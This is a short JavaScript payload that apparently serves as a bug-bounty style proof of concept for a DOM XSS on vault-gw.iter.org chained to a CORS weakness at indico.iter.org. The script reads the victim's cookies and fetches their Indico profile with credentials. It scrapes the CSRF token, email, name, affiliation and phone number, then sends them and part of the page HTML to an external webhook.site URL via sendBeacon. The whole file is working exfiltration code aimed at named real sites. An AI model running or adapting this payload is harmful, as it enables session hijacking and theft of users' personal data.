(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var cookies = document.cookie;

  fetch('https://indico.iter.org/user/profile/', {
    credentials: 'include'
  })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };

      var csrf = g(/csrfToken["':\s]+["']([^"']+)["']/)
        || g(/"csrf_token":\s*"([^"]+)"/)
        || g(/name="csrf_token"[^>]*value="([^"]+)"/)
        || g(/meta[^>]*csrf[^>]*content="([^"]+)"/i);

      var email = g(/name="email"[^>]*value="([^"]+)"/)
        || g(/"email":\s*"([^"]+)"/)
        || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);

      var firstName = g(/name="first_name"[^>]*value="([^"]+)"/)
        || g(/"first_name":\s*"([^"]+)"/);

      var lastName = g(/name="last_name"[^>]*value="([^"]+)"/)
        || g(/"last_name":\s*"([^"]+)"/);

      var affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
        || g(/"affiliation":\s*"([^"]+)"/);

      var phone = g(/name="phone"[^>]*value="([^"]+)"/)
        || g(/"phone":\s*"([^"]+)"/);

      var titleMatch = html.match(/<title>([^<]+)<\/title>/i);
      var who = titleMatch ? titleMatch[1].trim() : null;

      report({
        chain: 'domxss-to-indico-cors',
        origin: location.origin,
        cookies: cookies,
        csrf: csrf,
        user: who,
        email: email,
        first_name: firstName,
        last_name: lastName,
        affiliation: affiliation,
        phone: phone,
        html_start: html.substring(0, 3000)
      });
    })
    .catch(function (err) {
      report({
        chain: 'domxss-cookie-theft',
        origin: location.origin,
        cookies: cookies,
        error: err.message
      });
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
      + 'max-height:50vh;overflow:auto';
    b.textContent = 'PoC: vault-gw.iter.org DOM XSS\n'
      + 'Chain: ' + ev.chain + '\n'
      + 'Origin: ' + ev.origin + '\n'
      + 'Cookies: ' + (ev.cookies || '(none)').slice(0, 80) + '\n'
      + (ev.csrf ? 'CSRF: ' + ev.csrf + '\n' : '')
      + (ev.email ? 'Email: ' + ev.email + '\n' : '')
      + (ev.first_name ? 'Name: ' + ev.first_name + ' ' + (ev.last_name || '') + '\n' : '')
      + (ev.affiliation ? 'Affiliation: ' + ev.affiliation + '\n' : '')
      + (ev.phone ? 'Phone: ' + ev.phone + '\n' : '')
      + (ev.user ? 'Page: ' + ev.user + '\n' : '');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
